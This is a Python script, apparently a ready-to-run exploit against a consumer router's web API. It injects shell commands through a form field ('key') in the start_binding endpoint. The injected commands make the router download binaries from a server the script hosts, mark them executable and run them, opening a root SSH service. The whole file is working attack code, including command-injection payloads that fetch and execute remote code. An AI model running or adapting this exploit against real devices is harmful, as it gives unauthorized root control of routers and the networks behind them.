import threading
import requests
import http.server
import socketserver
import os
import base64
from urllib.parse import unquote
import logging
import sys

# Disable default HTTP server logging
logging.getLogger('http.server').setLevel(logging.CRITICAL)

# Configure logging
logging.basicConfig(
    level=logging.WARNING,
    format='%(message)s'
)

PORT = 8888
LOCAL_IP = "192.168.31.xx"
ROUTER_IP = "192.168.31.1"
TOKEN = ""

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    # Disable default logging
    def log_message(self, format, *args):
        return
    
    def do_GET(self):
        # Decode URL-encoded path
        decoded_path = unquote(self.path[1:])  # Remove leading '/'
        
        # First try to serve as a file
        if os.path.exists(decoded_path):
            # Serve the file using parent class method
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        
        # If file doesn't exist, try base64 decoding
        try:
            # Try to decode as base64
            decoded_message = base64.b64decode(decoded_path).decode('utf-8')
            # logging.warning(f"Received base64 message: \n{decoded_message}")
            
            # Check if message starts with the trigger phrase
            if decoded_message.startswith("Generating 2048 bit rsa key"):
                logging.warning(f"SSH Started. Login to {ROUTER_IP}:23323 with root and calculate the password from https://mi.tellme.top/")
                # Send response before shutting down
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                # Schedule server shutdown
                self.server.shutdown_flag = True
                return
            
            # Send success response
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
        except Exception as e:
            # If not valid base64, return 404
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
class CustomServer(socketserver.TCPServer):
    def __init__(self, server_address, handler_class):
        super().__init__(server_address, handler_class)
        self.shutdown_flag = False

    def serve_forever(self):
        while not self.shutdown_flag:
            self.handle_request()
        logging.info("Server shutdown complete")
        sys.exit(0)

def run_server(port=PORT):
    handler = CustomHandler
    with CustomServer(("", port), handler) as httpd:
        logging.warning(f"Start retriving SSH permission.")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            logging.warning("Server stopped by user")
            httpd.shutdown()
            
def create_payload():
    with open("ping1.template", "r") as file:
        template = file.read()
    # Replace Windows line endings with Unix line endings
    # template = template.replace('\r\n', '\n')
    template = template.replace("{{LOCAL_IP}}", LOCAL_IP).replace("{{PORT}}", str(PORT))
    with open("ping1", "wb") as file:
        file.write(template.encode())

def send_malicious_request():
    # Target URL
    url = f"http://{ROUTER_IP}/cgi-bin/luci/;stok={TOKEN}/api/xqsystem/start_binding"
    
    # Headers
    headers = {
        "Host": ROUTER_IP,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Payload
    data = f"uid=1234&key=1234'%0Arm%20-rf%20/tmp/ping1%0Awget%20\"http://{LOCAL_IP}:{PORT}/ping1\"%20-P%20/tmp'"
    
    try:
        # Send POST request
        requests.post(url, headers=headers, data=data, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        
    # Payload
    data = f"uid=1234&key=1234'%0Arm%20-rf%20/tmp/dropbear%0Awget%20\"http://{LOCAL_IP}:{PORT}/dropbear\"%20-P%20/tmp'"
    
    try:
        # Send POST request
        requests.post(url, headers=headers, data=data, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        
    # Payload
    data = f"uid=1234&key=1234'%0Arm%20-rf%20/tmp/dropbearkey%0Awget%20\"http://{LOCAL_IP}:{PORT}/dropbearkey\"%20-P%20/tmp'"
    
    try:
        # Send POST request
        requests.post(url, headers=headers, data=data, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")

def execute_payload():
    # Target URL
    url = f"http://{ROUTER_IP}/cgi-bin/luci/;stok={TOKEN}/api/xqsystem/start_binding"
    
    # Headers
    headers = {
        "Host": ROUTER_IP,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Payload
    data = f"uid=1234&key=1234'%0Achmod%20%2bx%20/tmp/ping1%0Achmod%20%2bx%20/tmp/dropbear%0Achmod%20%2bx%20/tmp/dropbearkey%0a/tmp/ping1'"
    
    try:
        # Send POST request
        requests.post(url, headers=headers, data=data, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")

if __name__ == "__main__":
    # Disable SSL warnings (only if using verify=False)
    requests.packages.urllib3.disable_warnings()
    
    # Start server in a separate thread so it doesn't block
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = False  # Thread will exit when main program exits
    server_thread.start()
    
    create_payload()
    send_malicious_request()
    execute_payload()
    
    server_thread.join()